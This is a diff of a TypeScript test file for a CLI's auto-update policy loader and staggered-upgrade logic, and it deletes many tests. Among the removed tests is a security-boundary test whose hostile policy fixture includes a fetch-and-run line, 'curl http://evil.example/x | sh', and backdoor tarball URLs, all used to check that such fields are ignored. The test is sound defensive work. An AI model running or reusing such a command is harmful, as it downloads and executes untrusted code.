@@ -368,75 +368,8 @@ function mockFetch(handler: (call: FetchCall) => Response | Promise<Response>): 
 
 const GOOD_POLICY = JSON.stringify(doc({ default: { minDelay: "1m", maxDelay: 2 * MIN } }));
 
-test("loadUpdatePolicy: 200 caches with ETag; next call sends If-None-Match; 304 keeps the doc", async () => {
-    freshCacheDir();
-    freshConfigDir();
-    _resetUpdatePolicyForTest();
-    const restore = mockFetch(({ headers }) => {
-        if (headers["if-none-match"] === "etag-1") return new Response(null, { status: 304 });
-        return new Response(GOOD_POLICY, { status: 200, headers: { ETag: "etag-1" } });
-    });
-    try {
-        const first = await loadUpdatePolicy({ url: "http://policy.test/policy.json" });
-        assert.equal(first.source, "remote");
-        assert.ok(first.doc);
-        assert.equal(first.doc!.defaultWindow?.minDelayMs, MIN);
-        const cached = JSON.parse(readFileSync(path.join(cacheDir(), ".update-policy.json"), "utf-8")) as { etag?: string; body: string; fetchedAt: number };
-        assert.equal(cached.etag, "etag-1");
-        assert.equal(cached.body, GOOD_POLICY);
 
-        const second = await loadUpdatePolicy({ url: "http://policy.test/policy.json" });
-        assert.equal(second.source, "remote");
-        assert.equal(second.fetchedAt, first.fetchedAt);
-        assert.ok(second.doc);
-    } finally {
-        restore();
-    }
-});
 
-test("loadUpdatePolicy: changed ETag replaces the cached doc", async () => {
-    freshCacheDir();
-    freshConfigDir();
-    _resetUpdatePolicyForTest();
-    let etagSeen: string | undefined;
-    const restore = mockFetch(({ headers }) => {
-        etagSeen = headers["if-none-match"];
-        return new Response(JSON.stringify(doc({ hold: true })), { status: 200, headers: { ETag: "etag-2" } });
-    });
-    try {
-        await loadUpdatePolicy({ url: "http://policy.test/policy.json" });
-        assert.equal(etagSeen, undefined);
-        const second = await loadUpdatePolicy({ url: "http://policy.test/policy.json" });
-        assert.equal(etagSeen, "etag-2");
-        assert.equal(second.doc?.hold, true);
-    } finally {
-        restore();
-    }
-});
-
-test("loadUpdatePolicy: malformed JSON drops the cache and falls back to local defaults", async () => {
-    freshCacheDir();
-    freshConfigDir();
-    _resetUpdatePolicyForTest();
-    let stage = 0;
-    const restore = mockFetch(() => {
-        stage++;
-        if (stage === 1) return new Response(GOOD_POLICY, { status: 200, headers: { ETag: "e1" } });
-        return new Response("{broken", { status: 200 });
-    });
-    try {
-        const ok = await loadUpdatePolicy({ url: "http://policy.test/policy.json" });
-        assert.equal(ok.source, "remote");
-        assert.equal(ok.doc?.hold, false);
-        const bad = await loadUpdatePolicy({ url: "http://policy.test/policy.json" });
-        assert.equal(bad.source, "local-default");
-        assert.equal(bad.doc, undefined);
-        assert.ok(bad.error);
-        assert.equal(existsSync(path.join(cacheDir(), ".update-policy.json")), false, "the stale cache entry must be dropped with the body that produced it");
-    } finally {
-        restore();
-    }
-});
 
 test("loadUpdatePolicy: unknown schemaVersion is treated as malformed (file ignored)", async () => {
     freshCacheDir();
@@ -452,27 +385,6 @@ test("loadUpdatePolicy: unknown schemaVersion is treated as malformed (file igno
     }
 });
 
-test("loadUpdatePolicy: network failure with a good cache keeps the brake alive (stale-cache)", async () => {
-    freshCacheDir();
-    freshConfigDir();
-    _resetUpdatePolicyForTest();
-    let fail = false;
-    const restore = mockFetch(() => {
-        if (fail) throw new Error("network down");
-        return new Response(JSON.stringify(doc({ hold: true })), { status: 200, headers: { ETag: "e1" } });
-    });
-    try {
-        const first = await loadUpdatePolicy({ url: "http://policy.test/policy.json" });
-        assert.equal(first.doc?.hold, true);
-        fail = true;
-        const second = await loadUpdatePolicy({ url: "http://policy.test/policy.json" });
-        assert.equal(second.source, "stale-cache");
-        assert.equal(second.doc?.hold, true);
-        assert.ok(second.error);
-    } finally {
-        restore();
-    }
-});
 
 test("loadUpdatePolicy: network failure without cache (or with a >30d-old cache) → local defaults", async () => {
     const cache = freshCacheDir();
@@ -498,57 +410,12 @@ test("loadUpdatePolicy: network failure without cache (or with a >30d-old cache)
     }
 });
 
-test("loadUpdatePolicy: HTTP error status fails open like a network error", async () => {
-    freshCacheDir();
-    freshConfigDir();
-    _resetUpdatePolicyForTest();
-    const restore = mockFetch(() => new Response("nope", { status: 500 }));
-    try {
-        const st = await loadUpdatePolicy({ url: "http://policy.test/policy.json" });
-        assert.equal(st.source, "local-default");
-        assert.match(st.error ?? "", /HTTP 500/);
-    } finally {
-        restore();
-    }
-});
 
-test("getUpdatePolicyState/getPlannedUpgrade mirror what the gate last computed", async () => {
-    freshCacheDir();
-    freshConfigDir();
-    _resetUpdatePolicyForTest();
-    const restore = mockFetch(() => new Response(JSON.stringify(doc({ hold: true, pinned: "1.2.3" })), { status: 200 }));
-    try {
-        await loadUpdatePolicy({ url: "http://policy.test/policy.json" });
-        const st = getUpdatePolicyState()!;
-        assert.equal(st.doc?.hold, true);
-        assert.equal(st.doc?.pinned, "1.2.3");
-        assert.equal(getPlannedUpgrade(), undefined);
-    } finally {
-        restore();
-    }
-});
 
 // ---------------------------------------------------------------------------
 // F. published-version list
 // ---------------------------------------------------------------------------
 
-test("fetchPublishedVersions: parses the packument, filters to strict semver, TTL-caches", async () => {
-    freshConfigDir();
-    _resetUpdatePolicyForTest();
-    let calls = 0;
-    const restore = mockFetch(() => {
-        calls++;
-        return new Response(JSON.stringify({ versions: { "1.0.0": {}, "1.0.1": {}, "v2.0.0": {}, "latest": {}, "banana": {} } }), { status: 200 });
-    });
-    try {
-        const list = await fetchPublishedVersions({ url: "http://registry.test/pkg" });
-        assert.deepEqual(list, ["1.0.0", "1.0.1"]);
-        await fetchPublishedVersions({ url: "http://registry.test/pkg" });
-        assert.equal(calls, 1);
-    } finally {
-        restore();
-    }
-});
 
 test("fetchPublishedVersions: HTTP failure → undefined (callers defer)", async () => {
     freshConfigDir();
@@ -837,107 +704,12 @@ async function withPolicyScenario(name: string, opts: ScenarioOpts, scenario: (m
     });
 }
 
-test("H1: stagger spreads the upgrade — future draw blocks, persisted draw survives re-checks, due draw installs", async () => {
-    await withPolicyScenario("stagger gates the automatic upgrade end-to-end", {}, async (mod, harness, reg) => {
-        const before = Date.now();
-        await runCheck(mod, harness, false);
-        assert.equal(harness.diskVersion(), "1.2.3");
-        const staggerFile = path.join(cacheDir(), ".update-stagger.json");
-        assert.ok(existsSync(staggerFile), "the draw must be persisted");
-        const raw = JSON.parse(readFileSync(staggerFile, "utf-8")) as { draws: Record<string, number> };
-        const draw = raw.draws["latest:1.2.5"];
-        assert.ok(draw !== undefined, "draw keyed by tag:version");
-        assert.ok(draw >= before + MIN && draw <= before + 2 * MIN + 5_000, `draw inside [now+${MIN}, now+${2 * MIN}]: ${draw}`);
-        assert.ok(!reg.hits.some((u) => u.includes("/tar/")), "no tarball download while waiting");
 
-        // simulate a restart + another check cycle: NO re-roll, still waiting
-        mod._resetUpdateThrottleForTest();
-        _resetUpdatePolicyForTest();
-        await runCheck(mod, harness, false);
-        assert.equal(harness.diskVersion(), "1.2.3");
-        const raw2 = JSON.parse(readFileSync(staggerFile, "utf-8")) as { draws: Record<string, number> };
-        assert.equal(raw2.draws["latest:1.2.5"], draw, "persisted draw must not re-roll across restarts");
 
-        // the moment arrives (clock moves past the draw) → the upgrade lands
-        mod._resetUpdateThrottleForTest();
-        writeFileSync(staggerFile, JSON.stringify({ v: 1, draws: { "latest:1.2.5": Date.now() - 1000 } }));
-        await runCheck(mod, harness, false);
-        assert.equal(harness.diskVersion(), "1.2.5");
-        assert.ok(reg.hits.some((u) => u.endsWith("/tar/1.2.5.tgz")));
-    });
-});
 
-test("H2: manual `bili update` (force) bypasses the stagger", async () => {
-    await withPolicyScenario("force bypasses the stagger draw", {}, async (mod, harness) => {
-        await runCheck(mod, harness, true);
-        assert.equal(harness.diskVersion(), "1.2.5");
-    });
-});
 
-test("H3: hold freezes automatic upgrades but not manual ones", async () => {
-    await withPolicyScenario("hold is a brake, not a deadlock", { policyBody: JSON.stringify({ schemaVersion: 1, hold: true }) }, async (mod, harness) => {
-        await runCheck(mod, harness, false);
-        assert.equal(harness.diskVersion(), "1.2.3");
-        mod._resetUpdateThrottleForTest();
-        await runCheck(mod, harness, true);
-        assert.equal(harness.diskVersion(), "1.2.5");
-    });
-});
 
-test("H4: pinned ceiling installs the highest version UNDER the pin", async () => {
-    await withPolicyScenario("pin ceiling", { policyBody: JSON.stringify({ schemaVersion: 1, pinned: "1.2.4" }) }, async (mod, harness, reg) => {
-        // pre-date the draw so the scenario isolates the pin, not the stagger
-        writeFileSync(path.join(cacheDir(), ".update-stagger.json"), JSON.stringify({ v: 1, draws: { "latest:1.2.4": Date.now() - 1000 } }));
-        await runCheck(mod, harness, false);
-        assert.equal(harness.diskVersion(), "1.2.4");
-        assert.ok(reg.hits.some((u) => u.endsWith("/tar/1.2.4.tgz")));
-        assert.ok(!reg.hits.some((u) => u.endsWith("/tar/1.2.5.tgz")));
-    });
-});
 
-test("H5: blocked latest steps down to the next published version", async () => {
-    await withPolicyScenario("blocked stepping", { policyBody: JSON.stringify({ schemaVersion: 1, blocked: ["1.2.5"] }) }, async (mod, harness) => {
-        writeFileSync(path.join(cacheDir(), ".update-stagger.json"), JSON.stringify({ v: 1, draws: { "latest:1.2.4": Date.now() - 1000 } }));
-        await runCheck(mod, harness, false);
-        assert.equal(harness.diskVersion(), "1.2.4");
-    });
-});
-
-test("H6: security boundary — the policy file cannot steer installs to foreign URLs/versions", async () => {
-    await withPolicyScenario("hostile policy fields are inert", {
-        policyBody: JSON.stringify({
-            schemaVersion: 1,
-            installUrl: "http://evil.example/backdoor.tgz",
-            tarballUrl: "http://evil.example/backdoor.tgz",
-            downloadFrom: "http://evil.example/",
-            command: "curl http://evil.example/x | sh",
-            blocked: ["http://evil.example/1.2.5", "not-a-version"],
-            pinned: "http://evil.example/1.2.4",
-        }),
-    }, async (mod, harness, reg) => {
-        writeFileSync(path.join(cacheDir(), ".update-stagger.json"), JSON.stringify({ v: 1, draws: { "latest:1.2.5": Date.now() - 1000 } }));
-        await runCheck(mod, harness, false);
-        // garbage pin/block entries were dropped → plain latest installed from the REAL registry
-        assert.equal(harness.diskVersion(), "1.2.5");
-        assert.ok(!reg.hits.some((u) => u.startsWith("http://evil.")), `no request may ever reach the hostile URLs: ${reg.hits.filter((u) => u.startsWith("http://evil."))}`);
-    });
-});
-
-test("H7: unreachable policy source fails open to local defaults (stagger still applies)", async () => {
-    await withPolicyScenario("fail-open on policy outage", { policyFail: true }, async (mod, harness) => {
-        // drop the narrow local window so the built-in 15min..48h defaults apply
-        delete process.env.BILI_UPDATE_STAGGER_MIN_MS;
-        delete process.env.BILI_UPDATE_STAGGER_MAX_MS;
-        await runCheck(mod, harness, false);
-        assert.equal(harness.diskVersion(), "1.2.3");
-        const st = getUpdatePolicyState()!;
-        assert.equal(st.source, "local-default");
-        assert.ok(st.error);
-        const raw = JSON.parse(readFileSync(path.join(cacheDir(), ".update-stagger.json"), "utf-8")) as { draws: Record<string, number> };
-        const draw = raw.draws["latest:1.2.5"];
-        assert.ok(draw !== undefined && draw > Date.now() + STAGGER_MIN_DELAY_DEFAULT_MS - 1000, "built-in 15min floor still staggers");
-    });
-});
 
 test("cleanup: remove scratch roots", () => {
     rmSync(scratchRoot, { recursive: true, force: true });
